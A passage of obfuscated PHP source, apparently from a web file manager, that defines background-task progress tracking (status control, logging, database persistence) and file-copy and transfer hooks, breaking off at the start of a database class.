"\163\x74\157\x70"; const STATYS_RUNNING = "\162\165\156\x6e\151\156\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($öŒâƒÅÁ, $ø¼İ“£¯ = '', $œıÄñ = 0, $¶·ğİæó = '') { $ûÏü¾Ş =& $_SERVER[¡¬ıÜ ƒ]; if (self::get($öŒâƒÅÁ)) { return; } $this->task = array($ûÏü¾Ş[477] => $öŒâƒÅÁ, $ûÏü¾Ş[1785] => USER_ID, $ûÏü¾Ş[1671] => $¶·ğİæó, $ûÏü¾Ş[528] => $ûÏü¾Ş[12], $ûÏü¾Ş[33] => $ø¼İ“£¯, $ûÏü¾Ş[1153] => $ûÏü¾Ş[12], $ûÏü¾Ş[1151] => $œıÄñ, $ûÏü¾Ş[1786] => 0, $ûÏü¾Ş[1787] => 0, $ûÏü¾Ş[1788] => 0, $ûÏü¾Ş[1789] => timeFloat(), $ûÏü¾Ş[1790] => 0, $ûÏü¾Ş[1791] => 0, $ûÏü¾Ş[1792] => 0, $ûÏü¾Ş[1793] => 0, $ûÏü¾Ş[830] => $ûÏü¾Ş[1734]); $GLOBALS[$ûÏü¾Ş[1794]] = 1; Hook::bind($ûÏü¾Ş[1738], array($this, $ûÏü¾Ş[1795])); Hook::bind($ûÏü¾Ş[1796], array($this, $ûÏü¾Ş[1797])); $this->startAfter(); Hook::trigger($ûÏü¾Ş[1798], $this->task); $this->task[$ûÏü¾Ş[1791]] = timeFloat(); } public function end($â¯ú“–† = '') { $±²òêç =& $_SERVER[¡¬ıÜ ƒ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$±²òêç[1791]]) { self::valueSet($this->task[$±²òêç[477]], !1); } $this->isEnd = !0; if ($â¯ú“–†) { $this->task[$±²òêç[528]] = $â¯ú“–†; } self::log($±²òêç[1799] . $this->task[$±²òêç[477]] . $±²òêç[1800] . sprintf($±²òêç[941], timeFloat() - $this->task[$±²òêç[1789]]) . $±²òêç[1801]); Hook::unbind($±²òêç[1738], array($this, $±²òêç[1795])); Hook::unbind($±²òêç[1796], array($this, $±²òêç[1797])); $this->endAfter(); $Ñ…™»ÀÓ = $this->task; $this->task = !1; Hook::trigger($±²òêç[1802], $Ñ…™»ÀÓ); } public function update($ÓÒ¹®« = 0, $‰©ãÙ¦¸ = false) { $‘‡Æ½ƒö =& $_SERVER[¡¬ıÜ ƒ]; $‡ÜÕÜ =& $this->task; if (!$‡ÜÕÜ) { return; } $‡ÜÕÜ[$‘‡Æ½ƒö[1786]] += $ÓÒ¹®«; $‡ÜÕÜ[$‘‡Æ½ƒö[1790]] = timeFloat(); if ($‡ÜÕÜ[$‘‡Æ½ƒö[1151]]) { if ($‡ÜÕÜ[$‘‡Æ½ƒö[1151]] < $‡ÜÕÜ[$‘‡Æ½ƒö[1786]]) { $‡ÜÕÜ[$‘‡Æ½ƒö[1151]] = $‡ÜÕÜ[$‘‡Æ½ƒö[1786]]; } $óÚæ˜­ç = timeFloat() - $‡ÜÕÜ[$‘‡Æ½ƒö[1789]] - $‡ÜÕÜ[$‘‡Æ½ƒö[1792]]; if ($óÚæ˜­ç <= 0) { $óÚæ˜­ç = 0.001; } $‡ÜÕÜ[$‘‡Æ½ƒö[1787]] = $‡ÜÕÜ[$‘‡Æ½ƒö[1786]] / $‡ÜÕÜ[$‘‡Æ½ƒö[1151]]; $‡ÜÕÜ[$‘‡Æ½ƒö[1788]] = $‡ÜÕÜ[$‘‡Æ½ƒö[1786]] / $óÚæ˜­ç; if ($‡ÜÕÜ[$‘‡Æ½ƒö[1787]] > 0) { $‡ÜÕÜ[$‘‡Æ½ƒö[1793]] = $óÚæ˜­ç * (1 - $‡ÜÕÜ[$‘‡Æ½ƒö[1787]]) / $‡ÜÕÜ[$‘‡Æ½ƒö[1787]]; } $‡ÜÕÜ[$‘‡Æ½ƒö[1793]] = $‡ÜÕÜ[$‘‡Æ½ƒö[1793]] <= 0 ? 0 : $‡ÜÕÜ[$‘‡Æ½ƒö[1793]]; } $this->updateAfter(); $·Š×îÊ = 0.2; if (timeFloat() - $‡ÜÕÜ[$‘‡Æ½ƒö[1791]] < $·Š×îÊ && !$‰©ãÙ¦¸) { return; } $ò¿¬‡¨ñ = self::get($‡ÜÕÜ[$‘‡Æ½ƒö[477]]); $¿‡±”Âî = $ò¿¬‡¨ñ[$‘‡Æ½ƒö[830]]; if ($¿‡±”Âî == self::STATYS_KILL) { $Üš¶î«× = array($‘‡Æ½ƒö[1803] => LNG($‘‡Æ½ƒö[1804]), $‘‡Æ½ƒö[1308] => !1); Cache::set($‘‡Æ½ƒö[1805] . $this->task[$‘‡Æ½ƒö[477]], $Üš¶î«×, 30); $this->onKill(); $this->end(); die; } else { if ($¿‡±”Âî == self::STATYS_STOP) { $„¼®ë° = 2; $ò¿¬‡¨ñ[$‘‡Æ½ƒö[1792]] += $„¼®ë°; self::valueSet($‡ÜÕÜ[$‘‡Æ½ƒö[477]], $ò¿¬‡¨ñ); sleep($„¼®ë°); $this->update(); return; } } $‡ÜÕÜ[$‘‡Æ½ƒö[830]] = $¿‡±”Âî ? $¿‡±”Âî : $‡ÜÕÜ[$‘‡Æ½ƒö[830]]; $‡ÜÕÜ[$‘‡Æ½ƒö[1792]] = $ò¿¬‡¨ñ[$‘‡Æ½ƒö[1792]] ? $ò¿¬‡¨ñ[$‘‡Æ½ƒö[1792]] : 0; $‡ÜÕÜ[$‘‡Æ½ƒö[1791]] = timeFloat(); Hook::trigger($‘‡Æ½ƒö[1806], $‡ÜÕÜ); self::valueSet($‡ÜÕÜ[$‘‡Æ½ƒö[477]], $‡ÜÕÜ); } public function onKillSet($Àâ©Íû, $Ü¿ª”ü = array()) { $this->onKillCall = array($Àâ©Íû, $Ü¿ª”ü); } public function onKill() { $ÍĞÒÜÏş =& $_SERVER[¡¬ıÜ ƒ]; self::log($ÍĞÒÜÏş[1799] . $this->task[$ÍĞÒÜÏş[477]] . $ÍĞÒÜÏş[1807]); Hook::trigger($ÍĞÒÜÏş[1808], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ˆôÕĞ–) { $šè•’¤ú =& $_SERVER[¡¬ıÜ ƒ]; Cache::set($šè•’¤ú[1805] . $this->task[$šè•’¤ú[477]], $ˆôÕĞ–, 60); if (!is_array($ˆôÕĞ–) || !$ˆôÕĞ–[$šè•’¤ú[1308]]) { self::log($šè•’¤ú[1809] . json_encode($ˆôÕĞ–)); } return $ˆôÕĞ–; } public static function get($¸ÎŠ¢) { $àÅÎ…£Í =& $_SERVER[¡¬ıÜ ƒ]; $Ú“•­Ò = self::valueGet($¸ÎŠ¢); if (is_array($Ú“•­Ò) && $Ú“•­Ò[$àÅÎ…£Í[1810]]) { $Îá¦™‡© = ActionApply($Ú“•­Ò[$àÅÎ…£Í[1810]], array($Ú“•­Ò)); $Ú“•­Ò = is_array($Îá¦™‡©) ? $Îá¦™‡© : $Ú“•­Ò; } return $Ú“•­Ò; } public static function listData() { $­µÔ×Â = self::valueGet(); return array_sort_by($­µÔ×Â, $_SERVER[¡¬ıÜ ƒ][1789], !0); } public static function kill($²ğÛ×å) { return self::changeStatus($²ğÛ×å, self::STATYS_KILL); } public static function stop($›ŸÂ‡É) { return self::changeStatus($›ŸÂ‡É, self::STATYS_STOP); } public static function restart($Œ¨¯ŞÉ®) { return self::changeStatus($Œ¨¯ŞÉ®, self::STATYS_RUNNING); } public static function killAll() { $ÌÜí©íŠ =& $_SERVER[¡¬ıÜ ƒ]; $·Ò»ëÌÑ = self::listData(); foreach ($·Ò»ëÌÑ as $ìÔó«Ò) { self::kill($ìÔó«Ò[$ÌÜí©íŠ[477]]); } sleep(2); foreach ($·Ò»ëÌÑ as $ìÔó«Ò) { self::valueSet($ìÔó«Ò[$ÌÜí©íŠ[477]], !1); } } private static function changeStatus($…Çœ¸¨È, $õëÕó) { $§•†ĞÜ =& $_SERVER[¡¬ıÜ ƒ]; $áæ°ÛñÉ = self::valueGet($…Çœ¸¨È); if (!$áæ°ÛñÉ) { return !1; } $áæ°ÛñÉ[$§•†ĞÜ[830]] = $õëÕó; self::valueSet($…Çœ¸¨È, $áæ°ÛñÉ); self::log($§•†ĞÜ[1811] . $áæ°ÛñÉ[$§•†ĞÜ[477]] . $§•†ĞÜ[1812] . $õëÕó); return !0; } public static function valueGet($µá‹ÈõŒ = false) { $´µŞ¨ùè =& $_SERVER[¡¬ıÜ ƒ]; if ($µá‹ÈõŒ) { $Ì»¼³±¶ = Model($´µŞ¨ùè[522])->where(array($´µŞ¨ùè[97] => $µá‹ÈõŒ, $´µŞ¨ùè[33] => $´µŞ¨ùè[1160]))->find(); return $Ì»¼³±¶ ? json_decode($Ì»¼³±¶[$´µŞ¨ùè[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($ü¯×ù… = false) { $­¥•ÌÑŞ =& $_SERVER[¡¬ıÜ ƒ]; $ öäÄ— = array($­¥•ÌÑŞ[33] => $­¥•ÌÑŞ[1160]); if ($ü¯×ù…) { $ öäÄ—[$­¥•ÌÑŞ[1785]] = $ü¯×ù…; } $Äóİ¡ë = Model($­¥•ÌÑŞ[522])->where($ öäÄ—)->select(); $Äóİ¡ë = $Äóİ¡ë ? $Äóİ¡ë : array(); foreach ($Äóİ¡ë as $·Öá›èø => $üöà‚È) { $Äóİ¡ë[$·Öá›èø] = json_decode($üöà‚È[$­¥•ÌÑŞ[452]], !0); } return $Äóİ¡ë; } public static function valueSet($Ä©²ôÙ, $ÛŞ’¯¯ä) { $£—»¸´ª =& $_SERVER[¡¬ıÜ ƒ]; if (!$ÛŞ’¯¯ä) { return Model($£—»¸´ª[522])->where(array($£—»¸´ª[97] => $Ä©²ôÙ, $£—»¸´ª[33] => $£—»¸´ª[1160]))->delete(); } $¡ØÔÓÈ = json_encode($ÛŞ’¯¯ä); if (!$¡ØÔÓÈ) { ob_start(); var_dump($ÛŞ’¯¯ä); $úê–‘ğ = ob_get_clean(); self::log($£—»¸´ª[1813] . json_encode_force($úê–‘ğ)); } if (!$Ä©²ôÙ || !$ÛŞ’¯¯ä[$£—»¸´ª[477]]) { return !1; } $•³«Šî› = array($£—»¸´ª[33] => $£—»¸´ª[1160], $£—»¸´ª[1785] => USER_ID, $£—»¸´ª[97] => $Ä©²ôÙ, $£—»¸´ª[452] => $¡ØÔÓÈ); $¨˜‚Åø© = $£—»¸´ª[1814]; CacheLock::lock($¨˜‚Åø©); Model($£—»¸´ª[522])->add($•³«Šî›, array(), !0); CacheLock::unlock($¨˜‚Åø©); } public static function log($ÆÏ’¦ˆİ) { if (!GLOBAL_DEBUG) { return; } write_log($ÆÏ’¦ˆİ, $_SERVER[¡¬ıÜ ƒ][1815]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Ïé‹Æü =& $_SERVER[¡¬ıÜ ƒ]; $¢Ë÷İÎõ =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Ïé‹Æü[1816], array($this, $Ïé‹Æü[1817])); Hook::bind($Ïé‹Æü[1319], array($this, $Ïé‹Æü[1818])); Hook::bind($Ïé‹Æü[1819], array($this, $Ïé‹Æü[1820])); Hook::bind($Ïé‹Æü[673], array($this, $Ïé‹Æü[1821])); Hook::bind($Ïé‹Æü[674], array($this, $Ïé‹Æü[1822])); Hook::bind($Ïé‹Æü[680], array($this, $Ïé‹Æü[1823])); Hook::bind($Ïé‹Æü[681], array($this, $Ïé‹Æü[1824])); Hook::bind($Ïé‹Æü[676], array($this, $Ïé‹Æü[1825])); Hook::bind($Ïé‹Æü[678], array($this, $Ïé‹Æü[1826])); Hook::bind($Ïé‹Æü[642], array($this, $Ïé‹Æü[1827])); Hook::bind($Ïé‹Æü[639], array($this, $Ïé‹Æü[1827])); Hook::bind($Ïé‹Æü[644], array($this, $Ïé‹Æü[1827])); Hook::bind($Ïé‹Æü[646], array($this, $Ïé‹Æü[1827])); Hook::bind($Ïé‹Æü[648], array($this, $Ïé‹Æü[1827])); Hook::bind($Ïé‹Æü[1828], array($this, $Ïé‹Æü[1829])); Hook::bind($Ïé‹Æü[664], array($this, $Ïé‹Æü[1830])); $this->sourceModelCopyFlag = !1; Hook::bind($Ïé‹Æü[1831], array($this, $Ïé‹Æü[1832])); Hook::bind($Ïé‹Æü[1833], array($this, $Ïé‹Æü[1834])); Hook::bind($Ïé‹Æü[1835], array($this, $Ïé‹Æü[1836])); $¢Ë÷İÎõ[$Ïé‹Æü[1837]] = LNG($Ïé‹Æü[1838]); $¢Ë÷İÎõ[$Ïé‹Æü[1839]] = 0; $¢Ë÷İÎõ[$Ïé‹Æü[1840]] = 0; $¢Ë÷İÎõ[$Ïé‹Æü[1153]] = $Ïé‹Æü[12]; $¢Ë÷İÎõ[$Ïé‹Æü[1841]] = $Ïé‹Æü[12]; $¢Ë÷İÎõ[$Ïé‹Æü[1842]] = 0; $¢Ë÷İÎõ[$Ïé‹Æü[1843]] = 0; $¢Ë÷İÎõ[$Ïé‹Æü[1844]] = 0; if (!$¢Ë÷İÎõ[$Ïé‹Æü[1671]]) { $¢Ë÷İÎõ[$Ïé‹Æü[1671]] = LNG($Ïé‹Æü[1845]); } } protected function endAfter() { $‡Í¬ãàã =& $_SERVER[¡¬ıÜ ƒ]; Hook::unbind($‡Í¬ãàã[1816], array($this, $‡Í¬ãàã[1817])); Hook::unbind($‡Í¬ãàã[1319], array($this, $‡Í¬ãàã[1818])); Hook::unbind($‡Í¬ãàã[1819], array($this, $‡Í¬ãàã[1820])); Hook::unbind($‡Í¬ãàã[673], array($this, $‡Í¬ãàã[1821])); Hook::unbind($‡Í¬ãàã[674], array($this, $‡Í¬ãàã[1822])); Hook::unbind($‡Í¬ãàã[680], array($this, $‡Í¬ãàã[1823])); Hook::unbind($‡Í¬ãàã[681], array($this, $‡Í¬ãàã[1824])); Hook::unbind($‡Í¬ãàã[676], array($this, $‡Í¬ãàã[1825])); Hook::unbind($‡Í¬ãàã[678], array($this, $‡Í¬ãàã[1826])); Hook::unbind($‡Í¬ãàã[642], array($this, $‡Í¬ãàã[1827])); Hook::unbind($‡Í¬ãàã[639], array($this, $‡Í¬ãàã[1827])); Hook::unbind($‡Í¬ãàã[644], array($this, $‡Í¬ãàã[1827])); Hook::unbind($‡Í¬ãàã[646], array($this, $‡Í¬ãàã[1827])); Hook::unbind($‡Í¬ãàã[648], array($this, $‡Í¬ãàã[1827])); Hook::unbind($‡Í¬ãàã[1828], array($this, $‡Í¬ãàã[1829])); Hook::unbind($‡Í¬ãàã[664], array($this, $‡Í¬ãàã[1830])); Hook::unbind($‡Í¬ãàã[1831], array($this, $‡Í¬ãàã[1832])); Hook::unbind($‡Í¬ãàã[1833], array($this, $‡Í¬ãàã[1834])); Hook::unbind($‡Í¬ãàã[1835], array($this, $‡Í¬ãàã[1836])); } public function copyMoveStart($¸Õ×³Í, $œ¡ôÊ‰”, $…¨ã¼å…, $‘¢Ö„À›) { $»¤¾ƒÓš =& $_SERVER[¡¬ıÜ ƒ]; self::log($»¤¾ƒÓš[1846] . $œ¡ôÊ‰” . $»¤¾ƒÓš[73] . $‘¢Ö„À›); $¡¢êÌ× = rtrim(TEMP_FILES, $»¤¾ƒÓš[8]); if (substr($œ¡ôÊ‰”, 0, strlen($¡¢êÌ×)) == $¡¢êÌ×) { return; } if (substr($‘¢Ö„À›, 0, strlen($¡¢êÌ×)) == $¡¢êÌ×) { return; } $­‡ÚÎì =& $this->task; $­‡ÚÎì[$»¤¾ƒÓš[1847]] = KodIO::transferType($¸Õ×³Í, $…¨ã¼å…); $this->update(); } public function updateAfter() { $¢‡ÊùÑ¾ =& $_SERVER[¡¬ıÜ ƒ]; $¸Î•–ÇÄ =& $this->task; if (!$¸Î•–ÇÄ[$¢‡ÊùÑ¾[843]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($¸Î•–ÇÄ[$¢‡ÊùÑ¾[1847]] == $¢‡ÊùÑ¾[1413]) { return; } self::updateTask($¸Î•–ÇÄ); } private static function updateTask(&$èë· ò) { $üúØ­ã =& $_SERVER[¡¬ıÜ ƒ]; if ($èë· ò[$üúØ­ã[1847]] == $üúØ­ã[1290] || $èë· ò[$üúØ­ã[1847]] == $üúØ­ã[110]) { if ($èë· ò[$üúØ­ã[1841]]) { $èë· ò[$üúØ­ã[1844]] = $èë· ò[$üúØ­ã[1843]] + $èë· ò[$üúØ­ã[1840]]; } } else { if ($èë· ò[$üúØ­ã[1847]] == $üúØ­ã[1414]) { if ($èë· ò[$üúØ­ã[1841]] == $üúØ­ã[1290]) { $èë· ò[$üúØ­ã[1844]] = $èë· ò[$üúØ­ã[1843]] + $èë· ò[$üúØ­ã[1840]] * 0.5; } else { if ($èë· ò[$üúØ­ã[1841]] == $üúØ­ã[110]) { $èë· ò[$üúØ­ã[1844]] = $èë· ò[$üúØ­ã[1843]] + $èë· ò[$üúØ­ã[1839]] * 0.5 + $èë· ò[$üúØ­ã[1840]] * 0.5; } } } } $èë· ò[$üúØ­ã[1787]] = $èë· ò[$üúØ­ã[1844]] / $èë· ò[$üúØ­ã[843]]; if ($èë· ò[$üúØ­ã[1787]] > 0) { $õÓ‘÷Ùñ = timeFloat() - $èë· ò[$üúØ­ã[1789]] - $èë· ò[$üúØ­ã[1792]]; $èë· ò[$üúØ­ã[1793]] = $õÓ‘÷Ùñ * (1 - $èë· ò[$üúØ­ã[1787]]) / $èë· ò[$üúØ­ã[1787]]; } } public function addPath($ÃßáÁÂì) { $ò°Ì‹ÕÄ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ÃßáÁÂì) { return; } $—í¢¡ö§ =& $this->task; $¯ûâœø³ = IO::infoWithChildren($ÃßáÁÂì); $¸Ÿƒ¬¨¡ = $—í¢¡ö§[$ò°Ì‹ÕÄ[1848]] ? $—í¢¡ö§[$ò°Ì‹ÕÄ[1848]][$ò°Ì‹ÕÄ[1849]] : 0; $—í¢¡ö§[$ò°Ì‹ÕÄ[1848]] = array($ò°Ì‹ÕÄ[1849] => $¸Ÿƒ¬¨¡ + 1, $ò°Ì‹ÕÄ[496] => $¯ûâœø³[$ò°Ì‹ÕÄ[32]], $ò°Ì‹ÕÄ[87] => $¯ûâœø³[$ò°Ì‹ÕÄ[87]], $ò°Ì‹ÕÄ[584] => $¯ûâœø³[$ò°Ì‹ÕÄ[584]] ? $¯ûâœø³[$ò°Ì‹ÕÄ[584]] : $¯ûâœø³[$ò°Ì‹ÕÄ[87]]); if ($¯ûâœø³[$ò°Ì‹ÕÄ[33]] == $ò°Ì‹ÕÄ[232]) { $—í¢¡ö§[$ò°Ì‹ÕÄ[1151]] += 1; } else { $—í¢¡ö§[$ò°Ì‹ÕÄ[1151]] += $¯ûâœø³[$ò°Ì‹ÕÄ[82]][$ò°Ì‹ÕÄ[80]]; if ($¯ûâœø³[$ò°Ì‹ÕÄ[193]]) { $—í¢¡ö§[$ò°Ì‹ÕÄ[1151]] += $¯ûâœø³[$ò°Ì‹ÕÄ[82]][$ò°Ì‹ÕÄ[81]] + 1; } } $—í¢¡ö§[$ò°Ì‹ÕÄ[843]] += $¯ûâœø³[$ò°Ì‹ÕÄ[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ï§ß¿) { } public function sourceAddHashEnd($¼´¥ºó‚) { } public function sourceAddFileStart($éÏ°¶øÍ) { $û›‡åÕœ =& $_SERVER[¡¬ıÜ ƒ]; $øØÏŸê =& $this->task; $øØÏŸê[$û›‡åÕœ[1839]] = $éÏ°¶øÍ[$û›‡åÕœ[79]]; $øØÏŸê[$û›‡åÕœ[1837]] = $éÏ°¶øÍ[$û›‡åÕœ[32]]; $øØÏŸê[$û›‡åÕœ[1153]] = $éÏ°¶øÍ[$û›‡åÕœ[32]]; $øØÏŸê[$û›‡åÕœ[1850]] = $éÏ°¶øÍ[$û›‡åÕœ[87]]; $this->update(); } public function sourceAddFileEnd($°Ê­˜‹Œ) { $¹öüë“Ù =& $_SERVER[¡¬ıÜ ƒ]; $áÄ÷” =& $this->task; $áÄ÷”[$¹öüë“Ù[1844]] += $°Ê­˜‹Œ[$¹öüë“Ù[79]]; $áÄ÷”[$¹öüë“Ù[1850]] = $°Ê­˜‹Œ[$¹öüë“Ù[87]]; $this->update(1); } public function copyFileStart($åÍ««ì¾, $§îé°îî, $Ìˆ²å®, $¹ŸÃ¢Õ•, $î¯µ€ĞÇ, $˜˜òúÉó) { $İ¯Ë¬íì =& $_SERVER[¡¬ıÜ ƒ]; $Ğ¬‚ˆ‚ˆ = $î¯µ€ĞÇ; if ($Ğ¬‚ˆ‚ˆ == $GLOBALS[$İ¯Ë¬íì[1851]]) { $Ğ¬‚ˆ‚ˆ = $GLOBALS[$İ¯Ë¬íì[1852]]; } $GLOBALS[$İ¯Ë¬íì[1852]] = $î¯µ€ĞÇ; $GLOBALS[$İ¯Ë¬íì[1851]] = $˜˜òúÉó; $úÍÄ‰ê =& $this->task; $úÍÄ‰ê[$İ¯Ë¬íì[1837]] = $Ğ¬‚ˆ‚ˆ; $úÍÄ‰ê[$İ¯Ë¬íì[1839]] = (int) $åÍ««ì¾->size($§îé°îî); $úÍÄ‰ê[$İ¯Ë¬íì[1840]] = 0; $úÍÄ‰ê[$İ¯Ë¬íì[1153]] = $İ¯Ë¬íì[12]; $úÍÄ‰ê[$İ¯Ë¬íì[1841]] = $İ¯Ë¬íì[12]; $úÍÄ‰ê[$İ¯Ë¬íì[1842]] = 0; $ıšÍ’’¼ = $úÍÄ‰ê[$İ¯Ë¬íì[1839]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($úÍÄ‰ê[$İ¯Ë¬íì[477]] . $İ¯Ë¬íì[1853]); if ($ıšÍ’’¼ && file_exists(get_path_father($¹ŸÃ¢Õ•))) { Cache::set($úÍÄ‰ê[$İ¯Ë¬íì[477]] . $İ¯Ë¬íì[1853], $¹ŸÃ¢Õ•); $úÍÄ‰ê[$İ¯Ë¬íì[1810]] = array($İ¯Ë¬íì[1854], $İ¯Ë¬íì[1855]); } $this->update(0, $ıšÍ’’¼); } public static function updateCopyLocalFileSize($®²Ã§Îõ) { $»ı„ü‰ =& $_SERVER[¡¬ıÜ ƒ]; $ë‘ñ‰Ï = Cache::get($®²Ã§Îõ[$»ı„ü‰[477]] . $»ı„ü‰[1853]); if (!$ë‘ñ‰Ï || !file_exists($ë‘ñ‰Ï)) { return $®²Ã§Îõ; } $®²Ã§Îõ[$»ı„ü‰[1840]] = @filesize($ë‘ñ‰Ï); $®²Ã§Îõ[$»ı„ü‰[1844]] += $®²Ã§Îõ[$»ı„ü‰[1840]]; self::updateTask($®²Ã§Îõ); return $®²Ã§Îõ; } public function copyFileEnd($”ùÁ™ü, $Ö‰«ó¬, $ €¤¾åó, $ÏŸ¨½½, $·“ÕÊ¸, $°­ãù‹œ) { $Í¾åŠÂ… =& $_SERVER[¡¬ıÜ ƒ]; $ÛÌ†®À =& $this->task; $ÛÌ†®À[$Í¾åŠÂ…[1840]] = $ÛÌ†®À[$Í¾åŠÂ…[1839]]; $ÛÌ†®À[$Í¾åŠÂ…[1841]] = $Í¾åŠÂ…[12]; unset($ÛÌ†®À[$Í¾åŠÂ…[1810]]); if ($·“ÕÊ¸ == $ÛÌ†®À[$Í¾åŠÂ…[1837]]) { $ÛÌ†®À[$Í¾åŠÂ…[1843]] += $ÛÌ†®À[$Í¾åŠÂ…[1839]]; $ÛÌ†®À[$Í¾åŠÂ…[1844]] = $ÛÌ†®À[$Í¾åŠÂ…[1843]]; $£áµûïí = 1; if (isset($ÛÌ†®À[$Í¾åŠÂ…[1850]]) && $ÛÌ†®À[$Í¾åŠÂ…[1850]] == $Ö‰«ó¬) { $£áµûïí = 0; } $this->update($£áµûïí); } else { $this->update(); $ÛÌ†®À[$Í¾åŠÂ…[1840]] = 0; } Cache::remove($ÛÌ†®À[$Í¾åŠÂ…[477]] . $Í¾åŠÂ…[1853]); self::log($Í¾åŠÂ…[1856] . $Ö‰«ó¬ . $Í¾åŠÂ…[73] . $ÏŸ¨½½ . $Í¾åŠÂ…[287] . $·“ÕÊ¸ . $Í¾åŠÂ…[1857] . $ÛÌ†®À[$Í¾åŠÂ…[1837]]); } public function updateFileEnd($Ìã¯Ê, $¬¶™åê) { $’Ù€Ùë =& $_SERVER[¡¬ıÜ ƒ]; $Ááí¢èñ =& $this->task; $Ááí¢èñ[$’Ù€Ùë[1837]] = $Ìã¯Ê; $Ááí¢èñ[$’Ù€Ùë[1839]] = $¬¶™åê; $Ááí¢èñ[$’Ù€Ùë[1843]] += $¬¶™åê; $Ááí¢èñ[$’Ù€Ùë[1844]] = $Ááí¢èñ[$’Ù€Ùë[1843]]; $this->update(1); self::log($’Ù€Ùë[1858] . $Ìã¯Ê); } public function sourceModelCopy($°¾‡†š—) { $î¡Ü³æ¿ =& $_SERVER[¡¬ıÜ ƒ]; $²àùæœ = $°¾‡†š—[0]; $’Éİ—ø† = $°¾‡†š—[1]; $³‰á¶‚ö =& $this->task; $this->sourceModelCopyFlag = !0; $Ì›‰¹‚ = 0; switch ($²àùæœ) { case $î¡Ü³æ¿[640]: $Ì›‰¹‚ = 1; break; case $î¡Ü³æ¿[643]: $³‰á¶‚ö[$î¡Ü³æ¿[1837]] = $’Éİ—ø†[$î¡Ü³æ¿[32]]; break; case $î¡Ü³æ¿[645]: $Ì›‰¹‚ = intval($°¾‡†š—[$î¡Ü³æ¿[458]] * 0.4); break; case $î¡Ü³æ¿[647]: $Ì›‰¹‚ = intval($°¾‡†š—[$î¡Ü³æ¿[458]] * 0.2); break; case $î¡Ü³æ¿[649]: $Ì›‰¹‚ = intval($°¾‡†š—[$î¡Ü³æ¿[458]] * 0.4); break; } $this->update($Ì›‰¹‚); $this->sourceModelCopyFlag = !1; } public function sourceRemove($ó°Œ, $ÌôöÀ) { $Ê‰¼å­ì =& $_SERVER[¡¬ıÜ ƒ]; $this->sourceModelCopyFlag = !0; $¸›ŸÒºŠ = 1; if (isset($ó°Œ[$Ê‰¼å­ì[82]])) { $¸›ŸÒºŠ = $ó°Œ[$Ê‰¼å­ì[82]][$Ê‰¼å­ì[80]]; $¸›ŸÒºŠ = $¸›ŸÒºŠ + $ó°Œ[$Ê‰¼å­ì[82]][$Ê‰¼å­ì[81]] + 1; } $this->update($¸›ŸÒºŠ); $this->sourceModelCopyFlag = !1; } public function sourceMove($¥ÇØû¹) { $this->sourceRemove($¥ÇØû¹, !1); } public function curlProgress($Íœ‡˜Ëğ, $ˆ½‚©ŞØ, $ˆ®¦²šµ, $Âò¸€ç, $Ö†ÔÑûÉ) { $ù…¨ëÛğ =& $_SERVER[¡¬ıÜ ƒ]; $†ØÉ§¬‘ =& $this->task; if ($Ö†ÔÑûÉ > 0) { $†ØÉ§¬‘[$ù…¨ëÛğ[1153]] = $ù…¨ëÛğ[1859]; $†ØÉ§¬‘[$ù…¨ëÛğ[1841]] = $ù…¨ëÛğ[110]; if ($†ØÉ§¬‘[$ù…¨ëÛğ[1839]]) { $†ØÉ§¬‘[$ù…¨ëÛğ[1840]] = $Ö†ÔÑûÉ; } if ($†ØÉ§¬‘[$ù…¨ëÛğ[1842]]) { $†ØÉ§¬‘[$ù…¨ëÛğ[1840]] = $Ö†ÔÑûÉ + $†ØÉ§¬‘[$ù…¨ëÛğ[1842]]; } } else { if ($ˆ®¦²šµ > 0) { if ($†ØÉ§¬‘[$ù…¨ëÛğ[1839]] == $ˆ½‚©ŞØ) { $†ØÉ§¬‘[$ù…¨ëÛğ[1840]] = $ˆ®¦²šµ; $†ØÉ§¬‘[$ù…¨ëÛğ[1153]] = $ù…¨ëÛğ[1860]; $†ØÉ§¬‘[$ù…¨ëÛğ[1841]] = $ù…¨ëÛğ[1290]; } } } $this->update(); } public function curlProgressStart($øæ£‡¼Ğ) { } public function curlProgressEnd($º™êÙô¶) { $©ôÎˆóø =& $_SERVER[¡¬ıÜ ƒ]; $¦Œ Œú =& $this->task; $ê¤¶±÷€ = curl_getinfo($º™êÙô¶); $À„˜î–• = $ê¤¶±÷€[$©ôÎˆóø[1861]]; if ($À„˜î–• == -1) { $À„˜î–• = $ê¤¶±÷€[$©ôÎˆóø[1862]]; } if ($¦Œ Œú[$©ôÎˆóø[1841]] == $©ôÎˆóø[110] && $À„˜î–•) { $¦Œ Œú[$©ôÎˆóø[1842]] += $À„˜î–•; } $this->update(); } } goto bñœ¨Ùâ×; B×·ŒˆŠğ: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\x68\x69\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\x3d", "\156\145\161" => "\x3c\x3e", "\x67\x74" => "\x3e", "\145\147\164" => "\76\75", "\x6c\x74" => "\74", "\x65\154\x74" => "\x3c\x3d", "\156\x6f\x74\x6c\x69\153\145" => "\116\x4f\x54\x20\x4c\111\113\105", "\x6c\x69\x6b\145" => "\x4c\x49\113\105", "\151\x6e" => "\111\x4e", "\156\157\164\151\156" => "\116\117\124\x20\111\116", "\156\157\164\40\151\156" => "\x4e\x4f\x54\x20\x49\x4e", "\142\145\x74\167\145\x65\x6e" => "\102\105\124\127\105\105\116", "\x6e\x6f\164\142\145\164\x77\145\145\x6e" 